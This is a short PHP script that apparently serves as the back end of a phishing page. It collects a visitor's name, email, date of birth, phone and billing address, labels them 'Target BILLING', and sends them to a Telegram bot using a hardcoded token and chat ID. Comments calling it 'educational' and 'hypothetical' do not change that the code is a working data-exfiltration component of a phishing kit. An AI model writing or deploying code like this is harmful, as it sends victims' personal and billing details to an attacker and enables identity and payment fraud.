<?php
// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Assuming you have a form field for email and password
    $email = filter_input(INPUT_POST, 'login-email', FILTER_SANITIZE_EMAIL);
    $name = filter_input(INPUT_POST, 'name', FILTER_SANITIZE_STRING);
    $dob = filter_input(INPUT_POST, 'dob', FILTER_SANITIZE_STRING);
    $phone = filter_input(INPUT_POST, 'phone', FILTER_SANITIZE_STRING);
    $add = filter_input(INPUT_POST, 'add', FILTER_SANITIZE_STRING);
    $city = filter_input(INPUT_POST, 'city', FILTER_SANITIZE_STRING);
    $zip = filter_input(INPUT_POST, 'zip', FILTER_SANITIZE_STRING);

 

 

    // For educational purposes, here's how you might format a message
    $message = " =========Target BILLING============" . 
    "\nFULL NAME : " . $name . 
    "\nEMAIL ADD : " . $email .
    "\nPHONE NUM : " . $phone .
    "\nBILLING 1 : " . $add .
    "\nCITY/TOWN : " . $city .
    "\nZIP  CODE : " . $zip;   
    ; 

    // Sending to a Telegram bot hypothetically
     $telegramBotToken = '6367338929:AAHMMbQSLxEpLOkX1027eYvgaumrd9-NRCk';
     $chatId = '1064643518';
     $url = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
    
    // Use file_get_contents or cURL to send the message
     $response = file_get_contents($url); // Make sure allow_url_fopen is enabled in your php.ini
   


}
?>
